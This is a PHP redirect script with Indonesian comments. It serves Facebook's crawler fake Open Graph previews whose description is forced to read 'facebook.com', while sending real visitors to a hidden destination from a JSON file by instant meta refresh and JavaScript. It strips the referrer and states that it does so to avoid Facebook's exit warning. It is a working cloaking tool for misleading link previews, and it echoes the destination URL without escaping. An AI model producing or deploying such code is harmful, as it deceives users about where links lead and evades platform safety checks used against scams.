<?php
$id = $_GET['id'] ?? '';

// Default Fallback jika data kosong
$destination = 'https://shopee.co.id';
$title       = 'Lihat Video Selengkapnya';
$description = 'facebook.com';
$image       = '';

// Ambil data dari JSON
if (!empty($id) && file_exists('database.json')) {
    $dbData = json_decode(file_get_contents('database.json'), true);
    if (isset($dbData[$id])) {
        $destination = $dbData[$id]['dest'];
        $title       = $dbData[$id]['title'];
        $image       = $dbData[$id]['img'];
        // Deskripsi dipaksa menjadi facebook.com sesuai permintaan Anda
        $description = 'facebook.com';
    }
}

$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';

// Deteksi Bot Facebook Crawler
$isFacebookBot = (strpos($userAgent, 'facebookexternalhit') !== false || strpos($userAgent, 'Facebot') !== false);

// Jika BUKAN Bot Facebook (Artinya ini Klik Manusia Asli dari FB maupun Browser Lain)
if (!$isFacebookBot) {
    // Pengalihan instan menggunakan Meta Refresh murni untuk menghindari popup "Keluar dari Aplikasi"
    header("Link: <$destination>; rel=\"prefetch\"");
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <meta name="referrer" content="no-referrer">
        <meta http-equiv="refresh" content="0;url=<?php echo $destination; ?>">
        <script type="text/javascript">
            // Backup jika Meta Refresh lambat bekerja di device tertentu
            window.location.href = "<?php echo $destination; ?>";
        </script>
    </head>
    <body>
        <p>Mengalihkan secara aman...</p>
    </body>
    </html>
    <?php
    exit;
} else {
    // Jika yang mengakses adalah BOT FACEBOOK (Saat status baru ditempel atau di-scand)
    // Tampilkan Meta Tag dengan Gambar Besar tanpa script pengalihan sama sekali
    ?>
    <!DOCTYPE html>
    <html lang="id">
    <head>
        <meta charset="UTF-8">
        <title><?php echo htmlspecialchars($title); ?></title>
        
        <meta property="og:type" content="article" />
        <meta property="og:title" content="<?php echo htmlspecialchars($title); ?>" />
        <meta property="og:description" content="<?php echo htmlspecialchars($description); ?>" />
        <meta property="og:image" content="<?php echo htmlspecialchars($image); ?>" />
        <meta property="og:image:secure_url" content="<?php echo htmlspecialchars($image); ?>" />
        <meta property="og:image:width" content="1200" />
        <meta property="og:image:height" content="630" />
        <meta property="og:image:type" content="image/jpeg" />
        
        <meta name="twitter:card" content="summary_large_image">
        <meta name="twitter:title" content="<?php echo htmlspecialchars($title); ?>">
        <meta name="twitter:description" content="<?php echo htmlspecialchars($description); ?>">
        <meta name="twitter:image" content="<?php echo htmlspecialchars($image); ?>">
    </head>
    <body>
        <p>Facebook Crawler Mode.</p>
    </body>
    </html>
    <?php
    exit;
}
?>
